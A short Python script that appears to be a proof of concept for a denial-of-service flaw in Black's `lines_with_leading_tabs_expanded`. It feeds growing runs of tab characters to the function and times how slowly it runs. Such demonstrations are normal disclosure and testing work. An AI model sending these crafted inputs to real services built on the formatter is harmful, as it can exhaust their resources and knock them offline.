import time
from black.strings import lines_with_leading_tabs_expanded


def timer(func):
    def wrapper(*args, **kwargs):
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Function '{func.__name__}' executed in {elapsed_time:.4f}s")
        return result

    return wrapper


def sizer(func):
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        print(f"Payload length: {args[0]}\nPayload size: {len(result.encode()) / (1024 ** 2)} MB")
        return result

    return wrapper


@sizer
def create_payload(char_length: int):
    return "\t" * char_length


@timer
def redos_poc_runner(char_length: int):
    print(char_length)
    lines_with_leading_tabs_expanded(create_payload(char_length))
    pass


if __name__ == '__main__':
    redos_poc_runner(100)
    redos_poc_runner(1000)
    redos_poc_runner(2000)